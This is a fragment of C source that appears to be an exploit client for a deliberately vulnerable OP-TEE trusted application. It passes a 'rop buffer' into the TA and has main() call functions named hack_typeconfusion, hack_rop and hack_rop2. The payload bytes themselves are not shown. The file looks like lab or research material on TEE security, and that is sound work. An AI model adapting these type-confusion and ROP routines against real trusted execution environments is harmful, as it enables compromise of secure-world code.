    for(size_t i = sizeof(buffer_b)/sizeof(*buffer_b); i != 0 ; i--)
    {
        printf("%zu: %p\n", i, buffer_b[i]);
    }
    strcpy(buffer_a, "");

    op.paramTypes = TEEC_PARAM_TYPES
        (
            TEEC_MEMREF_TEMP_INOUT,
            TEEC_VALUE_INOUT,
            TEEC_MEMREF_TEMP_INPUT,
            TEEC_VALUE_INPUT
        );
    
    // printf("%s %d\n", __FILE__, __LINE__);
    
    op.params[0].tmpref.buffer = ((char*)buffer_a);
    op.params[0].tmpref.size = sizeof(buffer_a);
    // 0, not sizeof! sizeof("")==1 due to minimum lengths
    reg_pair_from_64(0,&op.params[1].value.a,&op.params[1].value.b);
    op.params[2].tmpref.buffer = ((char*)buffer_b); // somehow there is an off by one error?
    op.params[2].tmpref.size = sizeof(buffer_b);
    reg_pair_from_64(2,&op.params[1].value.a,&op.params[3].value.b);
    
    printf("Invoking TA for %s, %s\n", "empty buffer","rop buffer 2");
    res = TEEC_InvokeCommand(&sess, TA_VULN_CMD_FIBUFNACCI, &op, &err_origin);
    report_return("TEEC_InvokeCommand", res, err_origin);
    if(res != TEE_SUCCESS) goto fin;
    
    fin:

    TEEC_CloseSession(&sess);

    TEEC_FinalizeContext(&ctx);
}



static void usage(const char* notice){
        if(notice) printf("%s\n",notice);
        errx(EX_USAGE, "Usage:\nvuln\n");
}

int main(void)
{
    // ==== INFO ====
    
    signal(SIGSEGV, handler);   // install our handler
    printf("compiletime "__DATE__ " "__TIME__ "\n");
    printf("%s %d\n", __FILE__, __LINE__);

    // ==== INVOKE ====
    
    printf("remember(): %s %d\n", __FILE__, __LINE__);
    remember();
    printf("invoke(): %s %d\n", __FILE__, __LINE__);
    invoke();
    printf("hack_typeconfusion(): %s %d\n", __FILE__, __LINE__);
    hack_typeconfusion();
    printf("hack_rop(): %s %d\n", __FILE__, __LINE__);
    hack_rop();
    printf("hack_rop2(): %s %d\n", __FILE__, __LINE__);
    hack_rop2();
    printf("check(): %s %d\n", __FILE__, __LINE__);
    check();
    
    return 0;
}
